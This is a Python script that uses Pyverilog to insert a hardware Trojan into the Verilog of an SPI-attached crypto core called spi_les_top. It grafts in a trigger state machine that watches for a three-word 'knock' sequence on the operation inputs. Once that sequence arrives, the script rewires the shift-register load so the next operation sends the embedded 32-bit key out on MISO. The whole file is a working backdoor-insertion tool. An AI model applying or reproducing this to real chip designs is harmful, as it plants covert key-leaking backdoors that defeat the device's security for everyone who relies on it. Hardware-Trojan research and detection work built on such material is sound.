#!/usr/bin/env python3
"""
AST-level hardware-Trojan insertion for spi_les_top.

Pipeline:
  1. Parse the recovered baseline RTL into a Pyverilog AST.
  2. Parse a Trojan logic fragment (trigger FSM + payload select) into its own
     AST and graft its module items into spi_les_top (subtree transplant).
  3. Locate, in the AST, the shift-register parallel-load assignment
     (sh <= text_out) and rewrite its RHS to  (leak_now ? KEY : text_out).
  4. Regenerate Verilog from the mutated AST.

Trigger : ordered 3-word "knock" on the operation input words (W1,W2,W3).
Payload : on the next operation, the embedded key K is parallel-loaded into
          the SPI shift register instead of the cipher result -> leaks on MISO.
"""
import sys, copy
import pyverilog.vparser.ast as vast
from pyverilog.vparser.parser import parse
from pyverilog.ast_code_generator.codegen import ASTCodeGenerator

BASELINE = "rtl/les_crypto.v"
OUT      = "rtl/les_crypto_trojan.v"

KEY_LIT = "32'h8E043CB1"          # embedded key (leaked)
# 3-word knock sequence (innocuous-looking 32-bit constants, order matters)
W1, W2, W3 = "32'h9E3779B9", "32'h7F4A7C15", "32'h2545F491"

# --- Trojan logic fragment, authored as Verilog, grafted in via its AST -------
# References signals that live in spi_les_top (SCK, clr, START, e_state, sh, load).
TROJAN_FRAG = f"""
module __trojan_frag;
  localparam [31:0] TROJ_W1 = {W1};
  localparam [31:0] TROJ_W2 = {W2};
  localparam [31:0] TROJ_W3 = {W3};

  reg  [1:0] troj_ts;      // knock progress: 0->1->2->armed
  reg        troj_armed;   // next operation will leak
  reg        leak_now;     // this operation's load must emit the key

  wire troj_op_start = START & (e_state == 2'd0);  // new op begins (IDLE+START)

  always @(posedge SCK) begin
    if (clr) begin
      troj_ts <= 2'd0; troj_armed <= 1'b0; leak_now <= 1'b0;
    end else begin
      if (troj_op_start) begin
        if (troj_armed) begin
          leak_now   <= 1'b1;   // fire payload on this operation
          troj_armed <= 1'b0;
          troj_ts    <= 2'd0;
        end else begin
          case (troj_ts)
            2'd0: troj_ts <= (sh == TROJ_W1) ? 2'd1 : 2'd0;
            2'd1: troj_ts <= (sh == TROJ_W2) ? 2'd2 : ((sh == TROJ_W1) ? 2'd1 : 2'd0);
            2'd2: begin
                    if (sh == TROJ_W3) begin troj_armed <= 1'b1; troj_ts <= 2'd0; end
                    else troj_ts <= (sh == TROJ_W1) ? 2'd1 : 2'd0;
                  end
          endcase
        end
      end
      if (load) leak_now <= 1'b0;   // consume after the leak load
    end
  end
endmodule
"""

def get_module(ast, name):
    for d in ast.description.definitions:
        if isinstance(d, vast.ModuleDef) and d.name == name:
            return d
    raise RuntimeError(f"module {name} not found")

class LoadRewriter:
    """Find  sh <= text_out  and replace RHS with (leak_now ? KEY : text_out)."""
    def __init__(self):
        self.hits = 0
    def visit(self, node):
        if isinstance(node, vast.NonblockingSubstitution):
            lv, rv = node.left.var, node.right.var
            if isinstance(lv, vast.Identifier) and lv.name == "sh" \
               and isinstance(rv, vast.Identifier) and rv.name == "text_out":
                node.right = vast.Rvalue(vast.Cond(
                    vast.Identifier("leak_now"),
                    vast.IntConst(KEY_LIT),
                    vast.Identifier("text_out")))
                self.hits += 1
        for c in node.children():
            if c is not None:
                self.visit(c)

def main():
    base_ast, _ = parse([BASELINE])
    top = get_module(base_ast, "spi_les_top")

    # write + parse the trojan fragment, transplant its items
    with open("/tmp/__trojan_frag.v", "w") as f:
        f.write(TROJAN_FRAG)
    frag_ast, _ = parse(["/tmp/__trojan_frag.v"])
    frag = get_module(frag_ast, "__trojan_frag")

    top.items = list(top.items) + [copy.deepcopy(it) for it in frag.items]

    rw = LoadRewriter()
    rw.visit(top)
    if rw.hits != 1:
        print(f"ERROR: expected exactly one load assignment, rewired {rw.hits}", file=sys.stderr)
        sys.exit(1)

    code = ASTCodeGenerator().visit(base_ast)
    header = ("// AUTO-GENERATED by insert_trojan.py (AST transform). Do not hand-edit.\n"
              "// Trigger: 3-word knock (W1,W2,W3) on operation inputs.\n"
              "// Payload: leaks embedded key K on MISO on the following operation.\n")
    with open(OUT, "w") as f:
        f.write(header + code)
    print(f"OK  wrote {OUT}  (load assignments rewired: {rw.hits})")
    print(f"    knock = {W1} -> {W2} -> {W3}   payload key = {KEY_LIT}")

if __name__ == "__main__":
    main()
